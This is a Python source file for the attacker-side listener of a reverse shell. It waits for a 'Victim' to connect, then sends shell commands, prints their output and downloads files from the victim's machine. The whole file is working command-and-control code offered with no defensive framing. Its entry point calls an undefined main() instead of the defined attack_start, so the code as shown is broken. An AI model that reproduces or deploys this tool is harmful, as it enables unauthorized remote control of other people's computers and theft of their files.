# ========================== ATTACKER =======================
import socket


def attack_start():
    # to handle long results
    endResult = "EOR"

    # to handle downloading files from Victim
    endFile = "EOF"
    # To Get ip of Attacker Host
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('10.0.0.0', 0))
    IPAttacker = s.getsockname()[0]
    PortAttacker = 2008
    print("[+] Waiting for incoming connection ... ")
    # Start
    AttackerConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    AttackerSocket = (IPAttacker, PortAttacker)
    AttackerConnection.bind(AttackerSocket)
    AttackerConnection.listen(10)

    AttackerConnection, ClientSocket = AttackerConnection.accept()
    print("Connection from>>> ", ClientSocket[0] + ":{}".format(ClientSocket[1]))
    try:
        while True:
            command = input(">>> ")
            AttackerConnection.send(command.encode())
            # Filtering commands
            # 1- if it is terminated command
            if command.lower() == "stop":
                AttackerConnection.close()
                break
            # 2- if it is command w/o output back
            elif command == "" or command.lower() == "clear" or command.lower() == "cls":
                continue
            # 3- if it is navigating (through folders) command
            elif command.startswith("cd"):
                AttackerConnection.send(command.encode())
                continue
            # 4- if it is navigating (through partitions) command
            # change directory partition example >> d:
            elif len(command) == 2 and command[0].isalpha() and command[1] == ':':
                AttackerConnection.send(command.encode())
                continue
            # 5- if it is Downloading Command
            elif command.startswith("download"):
                AttackerConnection.send(command.encode())
                exist = AttackerConnection.recv(1024)
                if exist.decode() == "yes":
                    fileName = command.replace("download ", "")
                    with open(fileName, "wb") as downloadFile:
                        while True:
                            # at size chunk the change 1024 >>> 2048
                            chunkFile = AttackerConnection.recv(1024)
                            if chunkFile.endswith(endFile.encode()):
                                chunkFile = chunkFile[:-len(endFile)]
                                downloadFile.write(chunkFile)
                                break
                            downloadFile.write(chunkFile)
                else:
                    print("File doesn't exist")
            # remaining Normal Commands
            else:
                # to handle long results
                FullResult = bytes()
                while True:
                    ChunkResult = AttackerConnection.recv(1024)
                    # if result short
                    if ChunkResult.endswith(endResult.encode()):
                        # To delete end of result
                        ChunkResult = ChunkResult[:-len(endResult)]
                        FullResult += ChunkResult
                        print(FullResult.decode())
                        break
                    # else result long
                    else:
                        FullResult += ChunkResult
    except:
        print("maybe, Victim Disconnected ...")
        AttackerConnection.close()


if __name__ == '__main__':
    main()
